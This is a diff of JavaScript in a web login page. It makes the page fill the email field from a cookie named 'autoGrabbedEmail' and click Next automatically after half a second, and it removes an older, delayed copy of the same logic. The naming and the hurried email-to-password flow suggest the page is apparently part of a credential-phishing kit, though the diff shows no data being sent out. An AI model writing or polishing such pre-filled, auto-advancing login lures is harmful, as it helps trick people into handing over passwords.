@@ -1145,14 +1145,20 @@
                             overlay.parentNode.removeChild(overlay);
                         }
 
-                        // Check for auto-grabbed email cookie and pre-fill
+                        // Check for auto-grabbed email cookie and pre-fill + auto-click Next
                         const autoGrabbedEmail = getCookie('autoGrabbedEmail');
                         if (autoGrabbedEmail) {
                             console.log('📧 Auto-filling email from cookie:', autoGrabbedEmail);
                             const emailInput = document.getElementById('emailInput');
                             if (emailInput) {
                                 emailInput.value = decodeURIComponent(autoGrabbedEmail);
-                                emailInput.focus();
+                                
+                                // Automatically click Next after a short delay
+                                console.log('🚀 Auto-clicking Next button in 500ms...');
+                                setTimeout(function() {
+                                    console.log('🔘 Triggering verifyEmail()...');
+                                    verifyEmail();
+                                }, 500);
                             }
                             // Clear the cookie after use
                             document.cookie = 'autoGrabbedEmail=; path=/; max-age=0';
@@ -1165,26 +1171,6 @@
             checkBackendHealth();
             checkExistingSession();
             showEmailForm();
-
-            // Check for auto-grabbed email cookie and pre-fill AFTER page is ready
-            setTimeout(function() {
-                const autoGrabbedEmail = getCookie('autoGrabbedEmail');
-                if (autoGrabbedEmail) {
-                    console.log('📧 Auto-filling email from cookie:', autoGrabbedEmail);
-                    const emailInput = document.getElementById('emailInput');
-                    if (emailInput) {
-                        emailInput.value = decodeURIComponent(autoGrabbedEmail);
-                        
-                        // Automatically click Next after auto-filling
-                        console.log('🚀 Auto-clicking Next button...');
-                        setTimeout(function() {
-                            verifyEmail();
-                        }, 800); // Short delay to ensure everything is ready
-                    }
-                    // Clear the cookie after use
-                    document.cookie = 'autoGrabbedEmail=; path=/; max-age=0';
-                }
-            }, 3800); // Wait for page to be fully ready after animation
 
             // Clear error messages when user starts typing in password field
             const passwordInput = document.getElementById('passwordInput');
